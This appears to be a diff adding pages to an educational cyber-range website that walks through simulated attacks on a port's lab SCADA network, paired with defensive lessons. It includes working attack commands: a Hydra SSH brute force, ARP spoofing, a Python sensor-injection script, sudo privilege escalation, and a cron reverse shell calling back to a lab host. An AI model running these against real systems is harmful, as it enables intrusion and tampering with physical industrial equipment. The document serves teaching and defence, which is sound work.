+        <div style="font-family:var(--disp);font-size:48px;color:var(--red);line-height:1;">10.0</div>
+        <div style="font-size:9.5px;color:var(--fog);margin-top:3px;">/ 10 CVSS Maximum Score</div>
+        <div style="font-size:12px;line-height:1.6;margin-top:10px;">Zero authentication on SCADA port 5020. Any device on the network can directly read and write industrial sensor data.</div>
+      </div></div>
+      <div class="SBC"><div class="SBH">Tools Used</div><div class="SBB">
+        <div class="KPI"><span class="KL">Network scanner</span><span style="font-family:var(--mono);font-size:10px;color:var(--cyan);">Nmap 7.95</span></div>
+        <div class="KPI"><span class="KL">CVE correlator</span><span style="font-family:var(--mono);font-size:10px;color:var(--cyan);">Python 3.12</span></div>
+        <div class="KPI"><span class="KL">Report generator</span><span style="font-family:var(--mono);font-size:10px;color:var(--cyan);">ReportLab PDF</span></div>
+        <div class="KPI"><span class="KL">CVE database</span><span style="font-family:var(--mono);font-size:10px;color:var(--cyan);">NVD / local</span></div>
+      </div></div>
+    </div>
+  </div>
+</div>
+</section>
+<footer><div class="FL">SIMULATION 01 · NETWORK RECONNAISSANCE · TANGER MED LAB</div><div class="FR"><a onclick="G('home')">← Home</a><a onclick="G('sim1')">Next: SSH Brute Force →</a></div></footer>
+</div>
+
+<!-- ╔══════════════════════════════════╗
+     ║  SIM 1 — SSH BRUTE FORCE        ║
+     ╚══════════════════════════════════╝ -->
+<div id="pg-sim1" class="pg">
+<section class="SH" style="background:var(--void);">
+  <div class="SHBG" style="background-image:linear-gradient(rgba(255,51,85,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,51,85,.04) 1px,transparent 1px);background-size:60px 60px;inset:0;position:absolute;"></div>
+  <div class="SHNUM">02</div>
+  <div class="W" style="position:relative;z-index:1;width:100%;">
+    <div class="BC"><span onclick="G('home')" style="cursor:pointer;color:var(--warm);">Home</span><span class="BCS">›</span><span class="BCC">Simulation 02 — SSH Brute Force</span></div>
+    <div class="eye R">Phase 2 · Initial access</div>
+    <h1 class="DL">SSH <span class="tr">BRUTE</span><br>FORCE</h1>
+    <div style="font-family:var(--mono);font-size:13px;letter-spacing:3px;color:var(--fog);margin-top:8px;text-transform:uppercase;">Hydra · OSINT Wordlist · Honeypot · Fail2ban Progressive · SIEM</div>
+  </div>
+</section>
+<section class="SP">
+<div class="W">
+  <div class="IB C"><div class="ibl">📖 For Learners — What is SSH Brute Force?</div><p>SSH (Secure Shell, port 22) is the standard remote management protocol for Linux servers. Every SCADA system, web server, and network device in a port uses SSH for remote access. Brute force means systematically trying passwords until one works. The critical insight in this simulation: instead of using a massive generic list (like rockyou.txt with 14 million entries), we built a <strong>contextual OSINT wordlist</strong> — passwords a Tanger Med employee would actually create — and found the correct password in just <strong>4 attempts</strong>. This demonstrates that password policies matter far more than people think.</p></div>
+  <div class="DTL">
+    <div>
+      <div class="eye R" style="margin-bottom:12px;">Step A — Building the OSINT Wordlist</div>
+      <h3 class="DS" style="margin-bottom:12px;">Why <span class="tr">context beats volume</span></h3>
+      <p class="BM" style="margin-bottom:12px;">Using public information about Tanger Med (official website, LinkedIn profiles, press releases, job postings), we built a targeted list of likely passwords. Real attackers do this before every campaign — it's called "OSINT reconnaissance." The result: the correct password appeared at position #4, while a generic wordlist might have tried millions of entries first.</p>
+      <pre class="CB R"><span class="CC"># tangermed_wordlist.txt — OSINT thematic wordlist built from public data</span>
+<span class="OUT">port_admin</span>          <span class="CC">← from job posting titles</span>
+<span class="OUT">crane_op_01</span>         <span class="CC">← from operational terminology</span>
+<span class="OUT">scada_admin</span>         <span class="CC">← from SCADA system references</span>
+<span class="WRN">tangermed2024</span>       <span class="CC">← FOUND at attempt #4 ✓</span>
+<span class="OUT">TangerMed@2026</span>
+<span class="OUT">Morocco@port</span>
+<span class="OUT">container123</span>
+<span class="OUT">maritime_2026</span>
+<span class="OUT">supervisor01</span>
+<span class="OUT">logistix@2024</span>
+<span class="CC">... + 90 more contextual passwords</span></pre>
+
+      <div class="eye R" style="margin-bottom:12px;margin-top:20px;">Step B — Launching Hydra Attack</div>
+      <h3 class="DS" style="margin-bottom:12px;">Breaking in with <span class="tr">4 attempts</span></h3>
+      <p class="BM" style="margin-bottom:12px;">Hydra is the most widely used network login attack tool. The <strong>-l flag</strong> specifies the username (portuser, discovered via recon), <strong>-P</strong> specifies our wordlist, <strong>-t 4</strong> uses 4 parallel threads, and <strong>-V</strong> shows verbose output so we see each attempt in real time. The attack runs against SSH on port 22 of the target.</p>
+      <pre class="CB R"><span class="CC"># Step B — Run Hydra from Kali Linux</span>
+<span class="CMD">hydra</span> <span class="FLG">-l</span> <span class="VAL">portuser</span> <span class="FLG">-P</span> <span class="VAL">~/ssh_lab/tangermed_wordlist.txt</span> <span class="FLG">-t 4 -V</span> <span class="VAL">192.168.64.2 ssh</span>
+
+<span class="CC"># Live output — each attempt visible:</span>
+<span class="OUT">[ATTEMPT][ssh] host: 192.168.64.2  login: portuser  pass: port_admin     → FAILED</span>
+<span class="OUT">[ATTEMPT][ssh] host: 192.168.64.2  login: portuser  pass: crane_op_01    → FAILED</span>
+<span class="OUT">[ATTEMPT][ssh] host: 192.168.64.2  login: portuser  pass: scada_admin    → FAILED</span>
+<span class="OK">[22][ssh] host: 192.168.64.2   login: portuser   password: tangermed2024</span>
+<span class="OK">1 of 1 target successfully completed</span>
+
+<span class="WRN">Time to compromise: &lt; 4 minutes | Attempts needed: 4</span></pre>
+
+      <div class="eye R" style="margin-bottom:12px;margin-top:20px;">Step C — Honeypot on Port 2222</div>
+      <h3 class="DS" style="margin-bottom:12px;">The invisible <span class="ta">intelligence trap</span></h3>
+      <p class="BM" style="margin-bottom:12px;">Simultaneously, a Python honeypot (built with Paramiko — the same library as real SSH servers) listens on port 2222. It perfectly mimics an SSH server's handshake but never grants access. When Fail2ban blocks port 22, Hydra automatically pivots to port 2222 — and we silently collect every credential it tries. The attacker never knows they walked into a trap. 89 credentials captured with full attacker fingerprint.</p>
+      <div class="HLOG">
+<span class="HT">[02:01:46]</span> <span class="HK">HONEYPOT</span> | <span class="HI">192.168.64.4:54832</span> | user=<span class="HU">portuser</span> | pass=<span class="HP">tangermed2024</span>
+<span class="HT">[02:01:46]</span> <span class="HK">HONEYPOT</span> | <span class="HI">192.168.64.4:54833</span> | user=<span class="HU">portuser</span> | pass=<span class="HP">crane_op_01</span>
+<span class="HT">[02:01:47]</span> <span class="HK">HONEYPOT</span> | <span class="HI">192.168.64.4:54834</span> | user=<span class="HU">portuser</span> | pass=<span class="HP">scada_admin</span>
+<span class="HT">[02:01:47]</span> <span class="HK">HONEYPOT</span> | <span class="HI">192.168.64.4:54835</span> | user=<span class="HU">portuser</span> | pass=<span class="HP">Morocco@port</span>
+<span class="HT">[02:01:47]</span> <span class="HK">HONEYPOT</span> | <span class="HI">192.168.64.4:54836</span> | user=<span class="HU">portuser</span> | pass=<span class="HP">container123</span>
+<span class="HT">[02:01:48]</span> <span class="HK">HONEYPOT</span> | <span class="HI">192.168.64.4:54837</span> | user=<span class="HU">portuser</span> | pass=<span class="HP">maritime_2026</span>
+<span class="HT">[02:08:22]</span> <span class="HK">HONEYPOT</span> | <span class="HI">192.168.64.4:55100</span> | user=<span class="HU">portuser</span> | pass=<span class="HP">TangerMed@2026</span>
+<span class="HT">[02:08:22]</span> <span class="HK">HONEYPOT</span> | <span class="HI">192.168.64.4:55101</span> | user=<span class="HU">portuser</span> | pass=<span class="HP">logistix@2024</span>
+<span class="CC">... 81 more credentials captured silently ...</span>
+<span class="OK">═══════════════════════════════════════</span>
+<span class="OK">TOTAL CAPTURES: 89 credentials | Attacker IP: 192.168.64.4</span></div>
+
+      <div class="eye R" style="margin-bottom:12px;margin-top:20px;">Step D — Fail2ban Progressive Banning</div>
+      <h3 class="DS" style="margin-bottom:12px;">The <span class="tg">escalating shield</span></h3>
+      <p class="BM" style="margin-bottom:12px;">Fail2ban monitors <strong>/var/log/auth.log</strong> in real time. After 5 failed SSH attempts in 60 seconds, it adds an iptables firewall rule to block the attacker's IP. The advanced configuration uses <strong>bantime.increment</strong> — every time the same IP is banned again, the duration doubles. This exponential backoff discourages persistent attackers far more effectively than a flat ban duration.</p>
+      <div class="BAN">
+        <div class="BANI bi0"><span class="BN">Ban #1</span><span class="BD">5 failed SSH attempts from 192.168.64.4 detected in 60s</span><span class="BV ta">1 min</span></div>
+        <div class="BANI bi1"><span class="BN">Ban #2</span><span class="BD">Attacker returned after ban expiry — banned again (×2)</span><span class="BV tr">2 min</span></div>
+        <div class="BANI bi2"><span class="BN">Ban #3</span><span class="BD">Third attempt — exponential escalation applied (×2)</span><span class="BV tr">4 min</span></div>
+      </div>
+      <pre class="CB G"><span class="CC"># /etc/fail2ban/jail.local — Progressive configuration</span>
+<span class="FLG">[DEFAULT]</span>
+<span class="OK">bantime.increment = true</span>     <span class="CC">← enables exponential escalation</span>
+<span class="OK">bantime.factor    = 2</span>        <span class="CC">← doubles the ban time each recurrence</span>
+<span class="OK">bantime.maxtime   = 3600</span>     <span class="CC">← cap at 1 hour maximum</span>
+<span class="FLG">[sshd]</span>
+<span class="VAL">maxretry = 5</span>                 <span class="CC">← trigger after 5 failures</span>
+<span class="VAL">findtime = 60</span>                <span class="CC">← within 60 seconds window</span>
+<span class="VAL">bantime  = 60</span>                <span class="CC">← base ban: 1 minute</span></pre>
+
+      <div class="eye R" style="margin-bottom:12px;margin-top:20px;">Step E — SIEM Alerts Generated</div>
+      <div class="AL">
+        <div class="AE"><div class="AEL LM">L5</div><div class="AER" style="color:var(--amber);">Rule 200001</div><div class="AEM">SSH connection attempt — 192.168.64.4 → portuser @ 192.168.64.2:22</div></div>
+        <div class="AE"><div class="AEL LC">L10</div><div class="AER" style="color:var(--red);">Rule 200002</div><div class="AEM">BRUTE FORCE DETECTED — 5 SSH failures in &lt;60s from 192.168.64.4</div></div>
+        <div class="AE"><div class="AEL LG">L7</div><div class="AER" style="color:var(--green);">Rule 200003</div><div class="AEM">FAIL2BAN — IP 192.168.64.4 automatically banned (ban #1 — 1 min)</div></div>
+        <div class="AE"><div class="AEL LC">L10</div><div class="AER" style="color:var(--red);">Rule 200004</div><div class="AEM">SSH INTRUSION — Successful login: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a2d2cdd0d6d7d1c7d0e2939b908c93949a8c94968c90">[email&#160;protected]</a> from 192.168.64.4</div></div>
+      </div>
+      <div class="IB G"><div class="ibl">🔵 Blue Team Lesson</div><p>This simulation proves that <strong>password-based SSH authentication is fundamentally weak</strong> in critical infrastructure. The fix is not a stronger password — it's replacing password auth entirely with SSH key pairs (RSA 4096 or Ed25519) and disabling PasswordAuthentication in sshd_config. With key-based auth, brute force becomes mathematically impossible. MFA (TOTP) adds a second layer.</p></div>
+    </div>
+    <div class="SB">
+      <div class="SBC"><div class="SBH">Attack Results</div><div class="SBB">
+        <div class="KPI"><span class="KL">Attempts to success</span><span class="KV tr">4</span></div>
+        <div class="KPI"><span class="KL">Total attack time</span><span class="KV tr">&lt;4 min</span></div>
+        <div class="KPI"><span class="KL">Honeypot captures</span><span class="KV ta">89</span></div>
+        <div class="KPI"><span class="KL">Fail2ban bans</span><span class="KV tg">3×</span></div>
+        <div class="KPI"><span class="KL">SIEM alerts</span><span class="KV tv">4</span></div>
+        <div class="KPI"><span class="KL">Auth.log failures</span><span class="KV" style="color:var(--warm);">24</span></div>
+      </div></div>
+      <div class="SBC"><div class="SBH">Password Cracked</div><div class="SBB" style="text-align:center;padding:18px 12px;">
+        <div style="font-family:var(--mono);font-size:12px;color:var(--red);background:var(--ra);border:1px solid var(--rb);padding:12px;letter-spacing:2px;">tangermed2024</div>
+        <div style="font-size:11px;color:var(--fog);margin-top:9px;">Rank #4 in contextual wordlist<br>vs. #2,847,563 in rockyou.txt</div>
+      </div></div>
+      <div class="SBC"><div class="SBH">Key Lesson</div><div class="SBB">
+        <p style="font-size:12.5px;line-height:1.7;">A password that seems strong (<code style="font-family:var(--mono);font-size:10px;">tangermed2024</code>) is trivially guessable with contextual OSINT. SSH key authentication makes brute force <strong style="color:var(--bone)">mathematically impossible</strong>.</p>
+      </div></div>
+    </div>
+  </div>
+</div>
+</section>
+<footer><div class="FL">SIMULATION 02 · SSH BRUTE FORCE · TANGER MED LAB</div><div class="FR"><a onclick="G('sim2')">← Sim 1</a><a onclick="G('sim3')">Next: SCADA Attack →</a></div></footer>
+</div>
+
+<!-- ╔══════════════════════════════════╗
+     ║  SIM 3 — SCADA MitM ATTACK      ║
+     ╚══════════════════════════════════╝ -->
+<div id="pg-sim3" class="pg">
+<section class="SH" style="background:var(--abyss);">
+  <div class="SHBG" style="background-image:linear-gradient(rgba(204,119,255,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(204,119,255,.04) 1px,transparent 1px);background-size:60px 60px;inset:0;position:absolute;"></div>
+  <div class="SHNUM">03</div>
+  <div class="W" style="position:relative;z-index:1;width:100%;">
+    <div class="BC"><span onclick="G('home')" style="cursor:pointer;color:var(--warm);">Home</span><span class="BCS">›</span><span class="BCC">Simulation 03 — SCADA / IoT MitM Attack</span></div>
+    <div class="eye V">Phase 4 · Maximum impact scenario</div>
+    <h1 class="DL">SCADA <span class="tv">MitM</span><br>ATTACK</h1>
+    <div style="font-family:var(--mono);font-size:13px;letter-spacing:3px;color:var(--fog);margin-top:8px;text-transform:uppercase;">ARP Spoofing · tcpdump · Python Sensor Injection · SIEM Real-time</div>
+  </div>
+</section>
+<section class="SP">
+<div class="W">
+  <div class="IB R"><div class="ibl">⚠️ Most Dangerous Scenario — Real Physical Consequences</div><p>This is the simulation that keeps cybersecurity professionals and port operators awake at night. The SCADA (Supervisory Control and Data Acquisition) system controls <strong>real physical equipment</strong> — 16-ton cranes, temperature sensors, GPS positioning, fuel gauges. When sensor data is falsified, operators see false readings and make decisions based on them. A crane operator seeing 14t on the display doesn't know the actual load is 38.5t — until equipment failure. This is why SCADA cybersecurity is classified as <strong>Critical Infrastructure Protection</strong> by governments worldwide.</p></div>
+  <div class="DTL">
+    <div>
+      <div class="eye V" style="margin-bottom:12px;">Step A — ARP Spoofing (Man-in-the-Middle)</div>
+      <h3 class="DS" style="margin-bottom:12px;">Becoming the <span class="tv">invisible middleman</span></h3>
+      <p class="BM" style="margin-bottom:12px;">ARP (Address Resolution Protocol) is how devices on a local network find each other. By sending forged ARP replies, we tell the Ubuntu SCADA server that Kali Linux is the network gateway. All traffic from Ubuntu now flows through Kali first — we're in the middle of every communication. <strong>IP forwarding</strong> must be enabled so traffic continues flowing (otherwise the attack becomes visible immediately).</p>
+      <pre class="CB V"><span class="CC"># Step A — Enable IP forwarding (traffic must keep flowing)</span>
+<span class="CMD">echo 1</span> <span class="VAL">&gt; /proc/sys/net/ipv4/ip_forward</span>
+
+<span class="CC"># Step A — ARP poison: tell Ubuntu that Kali IS the gateway</span>
+<span class="CMD">sudo arpspoof</span> <span class="FLG">-i eth0</span> <span class="FLG">-t</span> <span class="VAL">192.168.64.2</span> <span class="VAL">192.168.64.1</span>
+
+<span class="CC"># Result: Ubuntu's ARP cache now contains:</span>
+<span class="WRN">192.168.64.1  →  08:00:27:XX:XX:XX  (Kali MAC — NOT the real gateway!)</span>
+<span class="OK"># All SCADA traffic now passes through Kali before reaching destination</span></pre>
+
+      <div class="eye V" style="margin-bottom:12px;margin-top:20px;">Step B — Capturing Live SCADA Data</div>
+      <h3 class="DS" style="margin-bottom:12px;">Reading industrial sensors <span class="tv">in plaintext</span></h3>
+      <p class="BM" style="margin-bottom:12px;">With the MitM position established, every packet flowing through Kali is capturable. The SCADA protocol on port 5020 transmits sensor data with <strong>zero encryption</strong>. Tcpdump captures the data stream, and a Python parser reads the real-time industrial sensor values — crane weight, container temperature, GPS coordinates, fuel level.</p>
+      <pre class="CB V"><span class="CC"># Step B — Capture SCADA traffic in real time</span>
+<span class="CMD">sudo tcpdump</span> <span class="FLG">-i eth0 -w</span> <span class="VAL">capture_scada.pcap</span> <span class="FLG">port</span> <span class="VAL">5020</span>
+
+<span class="CC"># Python parser reads the captured stream:</span>
+<span class="OK">═══ LIVE SCADA SENSOR DATA — 192.168.64.2:5020 ═══</span>
+<span class="OUT">crane_01_weight  :  </span><span class="OK">14,676.0 kg</span>    <span class="CC">← real crane load</span>
+<span class="OUT">container_temp   :  </span><span class="OK">3.54°C</span>         <span class="CC">← refrigerated container</span>
+<span class="OUT">gps_latitude     :  </span><span class="OK">35.8842°N</span>      <span class="CC">← crane GPS position</span>
+<span class="OUT">gps_longitude    :  </span><span class="OK">-5.5023°E</span>
+<span class="OUT">fuel_level       :  </span><span class="OK">74.2%</span>
+<span class="CC"># All data in CLEARTEXT — zero encryption — readable by anyone on the network</span></pre>
+
+      <div class="eye V" style="margin-bottom:12px;margin-top:20px;">Step C — Injecting False Sensor Data</div>
+      <h3 class="DS" style="margin-bottom:12px;">Falsifying industrial <span class="tr">reality</span></h3>
+      <p class="BM" style="margin-bottom:12px;">The injection script (inject_v2.py) connects directly to the SCADA server's TCP port 5020 — which requires <strong>zero authentication</strong> — and sends crafted sensor readings. The values are chosen to be believable enough to avoid instant suspicion, but dangerous: 38,500 kg is 240% over the crane's safe capacity. Without SIEM, this injection would be completely invisible to operators.</p>
+      <div class="INJECD">
+        <div class="INJEDH">// inject_v2.py — False sensor data sent directly to SCADA port 5020</div>
+        <div class="INJEDB">
+          <span class="Is">crane_01_weight  </span><span class="Ia">→</span> <span class="Io">14,676 kg</span><span class="Ia">injected as</span><span class="If">38,500 kg</span> <span class="Ist">⚠ +162% — STRUCTURAL OVERLOAD RISK</span><br>
+          <span class="Is">container_temp   </span><span class="Ia">→</span> <span class="Io">3.54°C</span><span class="Ia">injected as</span><span class="If">87.5°C</span> <span class="Ist">⚠ CARGO DESTRUCTION SIMULATED</span><br>
+          <span class="Is">gps_latitude     </span><span class="Ia">→</span> <span class="Io">35.8842°N</span><span class="Ia">injected as</span><span class="If">0.0000°N</span> <span class="Ist">⚠ GPS LOCATION SPOOFED</span><br>
+          <span class="Is">fuel_level       </span><span class="Ia">→</span> <span class="Io">74.2%</span><span class="Ia">injected as</span><span class="If">0.0%</span> <span class="Ist">⚠ FALSE EMERGENCY SIGNAL</span>
+        </div>
+      </div>
+      <pre class="CB R"><span class="CC"># inject_v2.py — Core injection logic (SCADA has zero auth)</span>
+<span class="CMD">import</span> <span class="VAL">socket, json</span>
+<span class="CMD">s = socket.socket()</span>
+<span class="CMD">s.connect(</span><span class="VAL">('192.168.64.2', 5020)</span><span class="CMD">)</span>  <span class="CC">← zero auth required</span>
+<span class="VAL">payload = {</span>
+    <span class="OK">"crane_01_weight": 38500.0,</span>    <span class="CC">← 38.5 tons (real: 14.6t)</span>
+    <span class="OK">"container_temp": 87.5,</span>        <span class="CC">← 87.5°C (real: 3.5°C)</span>
+    <span class="OK">"fuel_level": 0.0</span>             <span class="CC">← 0% (real: 74.2%)</span>
+<span class="VAL">}</span>
+<span class="CMD">s.send(json.dumps(payload).encode())</span>
+<span class="OK"># Server accepted injection — no authentication, no verification</span></pre>
+
+      <div class="eye V" style="margin-bottom:12px;margin-top:20px;">Step D — SIEM Detection in Under 1 Second</div>
+      <div class="AL">
+        <div class="AE"><div class="AEL LM">L5</div><div class="AER" style="color:var(--cyan);">Rule 100001</div><div class="AEM">SCADA: External connection to port 5020 from 192.168.64.4</div></div>
+        <div class="AE"><div class="AEL LC">L10</div><div class="AER" style="color:var(--red);">Rule 100002</div><div class="AEM">CRITICAL: crane_01_weight = 38500 kg (threshold: 20000 kg) — OVERLOAD</div></div>
+        <div class="AE"><div class="AEL LC">L10</div><div class="AER" style="color:var(--red);">Rule 100003</div><div class="AEM">CRITICAL: container_temp = 87.5°C (threshold: 40°C) — SENSOR ANOMALY</div></div>
+        <div class="AE"><div class="AEL LH">L8</div><div class="AER" style="color:var(--amber);">Rule 100004</div><div class="AEM">ARP anomaly: 192.168.64.4 claiming gateway MAC address on eth0</div></div>
+      </div>
+      <div class="IB G"><div class="ibl">🔵 Blue Team Lesson</div><p>The SIEM detected every anomaly in under 1 second. <strong>Without the SIEM, these injections would have been completely invisible.</strong> The fix requires a complete SCADA security redesign: (1) Implement Modbus/TLS or OPC-UA with mutual certificate authentication, (2) Deploy an OT-aware IDS (Claroty, Dragos, Nozomi), (3) Network segment SCADA on a dedicated VLAN with strict ingress/egress rules, (4) Validate all sensor readings against physical limits before accepting them.</p></div>
+    </div>
+    <div class="SB">
+      <div class="SBC"><div class="SBH">Attack Results</div><div class="SBB">
+        <div class="KPI"><span class="KL">Sensors falsified</span><span class="KV tr">4 / 4</span></div>
+        <div class="KPI"><span class="KL">SIEM alerts</span><span class="KV tv">4</span></div>
+        <div class="KPI"><span class="KL">Detection time</span><span class="KV tg">&lt;1 second</span></div>
+        <div class="KPI"><span class="KL">Auth required</span><span class="KV tr">NONE</span></div>
+        <div class="KPI"><span class="KL">Crane overload %</span><span class="KV tr">+162%</span></div>
+      </div></div>
+      <div class="SBC"><div class="SBH">Injected Values</div><div class="SBB">
+        <div class="KPI"><span class="KL">Crane (real→fake)</span><span style="font-family:var(--mono);font-size:10px;color:var(--red);">14t → 38.5t</span></div>
+        <div class="KPI"><span class="KL">Temperature</span><span style="font-family:var(--mono);font-size:10px;color:var(--red);">3°C → 87.5°C</span></div>
+        <div class="KPI"><span class="KL">GPS</span><span style="font-family:var(--mono);font-size:10px;color:var(--red);">35.88 → 0.0</span></div>
+        <div class="KPI"><span class="KL">Fuel level</span><span style="font-family:var(--mono);font-size:10px;color:var(--red);">74% → 0%</span></div>
+      </div></div>
+      <div class="SBC"><div class="SBH">SCADA-001 Rating</div><div class="SBB" style="text-align:center;padding:18px 12px;">
+        <div style="font-family:var(--disp);font-size:54px;color:var(--red);line-height:1;">10.0</div>
+        <div style="font-size:9.5px;color:var(--fog);margin-top:3px;">CVSS Maximum Score</div>
+        <div style="font-size:12px;color:var(--text);margin-top:10px;line-height:1.6;">Zero auth + plaintext protocol + direct physical impact = the highest possible risk classification.</div>
+      </div></div>
+    </div>
+  </div>
+</div>
+</section>
+<footer><div class="FL">SIMULATION 03 · SCADA MitM ATTACK · TANGER MED LAB</div><div class="FR"><a onclick="G('sim1')">← Sim 2</a><a onclick="G('sim4')">Next: Lateral Movement →</a></div></footer>
+</div>
+
+<!-- ╔══════════════════════════════════╗
+     ║  SIM 4 — LATERAL MOVEMENT       ║
+     ╚══════════════════════════════════╝ -->
+<div id="pg-sim4" class="pg">
+<section class="SH" style="background:var(--void);">
+  <div class="SHBG" style="background-image:linear-gradient(rgba(0,220,200,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,220,200,.04) 1px,transparent 1px);background-size:60px 60px;inset:0;position:absolute;"></div>
+  <div class="SHNUM">04</div>
+  <div class="W" style="position:relative;z-index:1;width:100%;">
+    <div class="BC"><span onclick="G('home')" style="cursor:pointer;color:var(--warm);">Home</span><span class="BCS">›</span><span class="BCC">Simulation 04 — Lateral Movement & Privilege Escalation</span></div>
+    <div class="eye">Phase 3 · Pivot, escalate, persist</div>
+    <h1 class="DL">LATERAL <span class="tc">MOVE</span><br>& PIVOT</h1>
+    <div style="font-family:var(--mono);font-size:13px;letter-spacing:3px;color:var(--fog);margin-top:8px;text-transform:uppercase;">SSH Pivot · sudo Escalation · Root Shell · Backdoor · Forensics</div>
+  </div>
+</section>
+<section class="SP">
+<div class="W">
+  <div class="IB C"><div class="ibl">📖 For Learners — What is Lateral Movement & Privilege Escalation?</div><p>After gaining initial SSH access as a low-privilege user (portuser), the attacker's goal is to <strong>escalate privileges</strong> (become root/administrator) and <strong>move laterally</strong> (reach systems not directly accessible). In this simulation, a single misconfigured sudo rule — allowing portuser to run python3 as root with no password — turns a limited shell into complete system control in under one second. This is one of the most common real-world attack patterns: initial access is low-privilege, but misconfigured permissions create the path to total compromise.</p></div>
+  <div class="DTL">
+    <div>
+      <div class="STATS">
+        <div class="SC"><span class="SCV tc">6</span><span class="SCL">Attack Phases</span></div>
+        <div class="SC"><span class="SCV tr">1 cmd</span><span class="SCL">To Root Access</span></div>
+        <div class="SC"><span class="SCV ta">2</span><span class="SCL">Backdoors Planted</span></div>
+        <div class="SC"><span class="SCV tg">100%</span><span class="SCL">All Detected</span></div>
+      </div>
+
+      <div class="eye" style="margin-bottom:12px;margin-top:8px;">Phase 1 — SSH Login as portuser</div>
+      <h3 class="DS" style="margin-bottom:12px;">Using the cracked <span class="tc">credential</span></h3>
+      <p class="BM" style="margin-bottom:12px;">Using the password cracked in Simulation 2 (tangermed2024), we SSH into the Ubuntu SCADA server as portuser. This is a low-privilege account — but it's our foothold inside the network. From here, we conduct internal reconnaissance that's impossible from outside.</p>
+      <pre class="CB"><span class="CC"># Phase 1 — SSH login from Kali to Ubuntu</span>
+<span class="CMD">ssh</span> <span class="VAL"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="83f3ecf1f7f6f0e6f1c3b2bab1adb2b5bbadb5b7adb1">[email&#160;protected]</a></span>    <span class="CC">← password: tangermed2024</span>
+<span class="OK">portuser@serveur-SCADA:~$</span>  <span class="CC">← foothold established</span></pre>
+
+      <div class="eye" style="margin-bottom:12px;margin-top:28px;">Phase 2 — Internal Reconnaissance</div>
+      <h3 class="DS" style="margin-bottom:12px;">Mapping the inside <span class="tc">from within</span></h3>
+      <p class="BM" style="margin-bottom:12px;">From inside the network, we can see services invisible from outside. MySQL on port 3306 is bound to 127.0.0.1 — completely hidden from external Nmap scans. We can also see the SCADA server running as root, and identify other logged-in users. This internal view is what makes lateral movement so powerful.</p>
+      <pre class="CB"><span class="CC"># Internal network services — invisible from outside!</span>
+<span class="CMD">ss</span> <span class="FLG">-tlnp</span>
+<span class="OK">LISTEN  0.0.0.0:22</span>    <span class="CC">← SSH (already knew)</span>
+<span class="OK">LISTEN  0.0.0.0:5020</span>  <span class="CC">← SCADA (already knew)</span>
+<span class="WRN">LISTEN  127.0.0.1:3306</span> <span class="CC">← MySQL! HIDDEN FROM EXTERNAL SCAN</span>
+<span class="OK">LISTEN  0.0.0.0:80</span>    <span class="CC">← Apache (already knew)</span>
+
+<span class="CC"># SCADA process running as ROOT — critical finding</span>
+<span class="CMD">ps aux | grep python</span>
+<span class="ERR">root    3143  python3 /home/nezuku/scada_lab/scada_server.py</span>
+
+<span class="CC"># Other users currently logged in</span>
+<span class="CMD">who</span>
+<span class="OK">nezuku   tty2  (admin — graphical session)</span>
+<span class="OK">portuser pts/1 192.168.64.4 (us — SSH session)</span></pre>
+
+      <div class="eye" style="margin-bottom:12px;margin-top:28px;">Phase 3 — Privilege Escalation to Root</div>
+      <h3 class="DS" style="margin-bottom:12px;">From user to <span class="tr">root in 1 command</span></h3>
+      <p class="BM" style="margin-bottom:12px;">The most critical finding: running <strong>sudo -l</strong> shows portuser is allowed to run /usr/bin/python3 as root without a password. This is a classic "GTFOBins" privilege escalation — Python can spawn system shells, and since it runs as root, the spawned shell is also root. This misconfiguration likely exists because someone wanted portuser to run SCADA scripts with elevated permissions, without understanding the security implications.</p>
+      <pre class="CB R"><span class="CC"># Step 1 — Check what we're allowed to run as root</span>
+<span class="CMD">sudo -l</span>
+<span class="WRN">(ALL) NOPASSWD: /usr/bin/python3</span>  <span class="CC">← portuser can run python3 as root, no password!</span>
+
+<span class="CC"># Step 2 — Exploit it: python3 spawns a bash shell AS ROOT</span>
+<span class="CMD">sudo python3</span> <span class="FLG">-c</span> <span class="VAL">"import os; os.system('/bin/bash')"</span>
+
+<span class="CC"># Result — we are now root:</span>
+<span class="ERR">root@serveur-SCADA:~# id</span>
+<span class="ERR">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="OK"># TOTAL SYSTEM COMPROMISE ACHIEVED IN 1 COMMAND</span>
+<span class="CC"># Time from SSH login to root: under 10 seconds</span></pre>
+
+      <div class="eye" style="margin-bottom:12px;margin-top:28px;">Phase 4 — Direct SCADA Access as Root</div>
+      <h3 class="DS" style="margin-bottom:12px;">Reading live sensors <span class="tc">from inside</span></h3>
+      <pre class="CB"><span class="CC"># From root shell — read live SCADA data directly</span>
+<span class="CMD">python3</span> <span class="VAL">/home/nezuku/scada_lab/scada_server.py</span> <span class="FLG">&amp;</span>
+<span class="CC"># Real readings captured:</span>
+<span class="OK">crane_weight  =  14,676.3 kg</span>
+<span class="OK">temperature   =  3.54°C</span>
+<span class="OK">fuel_level    =  74.2%</span>
+
+<span class="CC"># Injection (same script as Sim 3 but now from inside as root)</span>
+<span class="CMD">python3 /tmp/inject_v2.py</span>
+<span class="ERR">INJECTED: crane_weight=38500.0, temperature=87.5, fuel_level=0.0</span></pre>
+
+      <div class="eye" style="margin-bottom:12px;margin-top:28px;">Phase 5 — Persistence: 2 Backdoors Installed</div>
+      <h3 class="DS" style="margin-bottom:12px;">Surviving <span class="tr">reboots & password changes</span></h3>
+      <p class="BM" style="margin-bottom:12px;">As root, we install two persistence mechanisms: (1) a cron job that fires a reverse shell every minute, and (2) an SSH backdoor key — so even if portuser's password is changed, the attacker can SSH directly to root. Both are the exact techniques used in real APT campaigns.</p>
+      <pre class="CB R"><span class="CC"># Backdoor 1 — Cron reverse shell (fires every minute to Kali)</span>
+<span class="CMD">(crontab -l 2>/dev/null; echo "* * * * * bash -i &gt;&amp; /dev/tcp/192.168.64.4/4444 0&gt;&amp;1") | crontab -</span>
+
+<span class="CC"># On Kali — listen for incoming connection</span>
+<span class="CMD">nc</span> <span class="FLG">-lvnp</span> <span class="VAL">4444</span>
+<span class="OK">Connection from 192.168.64.2:55123</span>
+<span class="ERR">root@serveur-SCADA:~# id</span>
+<span class="ERR">uid=0(root) gid=0(root)  ← ROOT SHELL DELIVERED TO KALI</span>
+
+<span class="CC"># Backdoor 2 — SSH key installed in root's authorized_keys</span>
